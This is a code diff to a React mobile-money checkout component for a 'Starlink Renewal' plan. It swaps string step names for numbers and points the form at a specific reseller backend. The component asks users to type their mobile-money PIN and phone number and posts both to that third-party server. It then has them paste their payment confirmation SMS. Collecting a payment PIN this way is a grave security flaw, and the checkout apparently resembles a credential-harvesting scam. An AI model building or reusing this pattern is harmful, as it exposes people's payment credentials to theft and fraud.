@@ -1,7 +1,7 @@
 import React, { useState } from 'react';
 
 export default function MoMoCheckout({ plan = 'Starlink Renewal', amount = 1200, onClose, onSuccess }) {
-const [step, setStep] = useState('payment');
+const [step, setStep] = useState(1); // Step 1: Payment (Phone + PIN), Step 2: SMS Verification
 const [phone, setPhone] = useState('');
 const [pin, setPin] = useState('');
 const [smsContent, setSmsContent] = useState('');
@@ -14,7 +14,7 @@ setLoading(true);
 setError('');
 
 try {
-  const res = await fetch('https://your-backend-url.onrender.com/api/momo/pay', {
+  const res = await fetch('https://starlink-reseller-backend.onrender.com/api/momo/pay', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({ phone, pin, amount, plan })
@@ -22,7 +22,7 @@ try {
   const data = await res.json();
   
   if (!res.ok) throw new Error(data.message || 'Payment initiation failed');
-  setStep('verification');
+  setStep(2); // Move to SMS verification step
 } catch (err) {
   setError(err.message);
 } finally {
@@ -36,7 +36,7 @@ setLoading(true);
 setError('');
 
 try {
-  const res = await fetch('https://your-backend-url.onrender.com/api/momo/verify-sms', {
+  const res = await fetch('https://starlink-reseller-backend.onrender.com/api/momo/verify-sms', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({ smsContent, phone })
@@ -61,7 +61,7 @@ return (
       </div>
     )}
 
-    {step === 'payment' ? (
+    {step === 1 ? (
       <form onSubmit={handlePaymentSubmit}>
         <div className="text-center mb-6">
           <span className="text-xs uppercase tracking-wider text-white/50">Total</span>
@@ -117,7 +117,7 @@ return (
         <div className="flex items-center mb-4">
           <button 
             type="button" 
-            onClick={() => setStep('payment')}
+            onClick={() => setStep(1)}
             className="text-sm text-amber-500 hover:underline flex items-center gap-1"
           >
             ← Back
@@ -126,7 +126,7 @@ return (
 
         <div className="mb-6">
           <h2 className="text-xl font-bold text-white">SMS Verification</h2>
-          <p className="text-xs text-white/60 mt-1">Please paste the full payment SMS received.</p>
+          <p className="text-xs text-white/60 mt-1">Please paste the full payment confirmation SMS received.</p>
         </div>
 
         <div className="mb-6">
